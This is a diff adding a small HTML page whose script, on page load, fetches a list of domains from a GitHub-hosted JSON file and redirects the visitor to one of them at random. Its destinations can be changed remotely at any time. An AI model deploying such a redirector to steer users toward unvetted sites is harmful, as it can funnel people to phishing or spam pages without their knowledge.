@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Redirecting...</title>
+  <script>
+    async function redirectToRandomDomain() {
+      const jsonUrl = 'https://raw.githubusercontent.com/devdrift80/supreme-octo-potato/main/domains.json';
+      try {
+        const response = await fetch(jsonUrl);
+        const data = await response.json();
+        const domains = data.domains;
+        const randomDomain = domains[Math.floor(Math.random() * domains.length)];
+        window.location.href = randomDomain;
+      } catch (error) {
+        console.error('Error fetching domains:', error);
+        window.location.href = 'https://www.google.com'; // Fallback URL
+      }
+    }
+    redirectToRandomDomain();
+  </script>
+</head>
+<body>
+  <p>Redirecting to a random domain...</p>
+</body>
+</html>
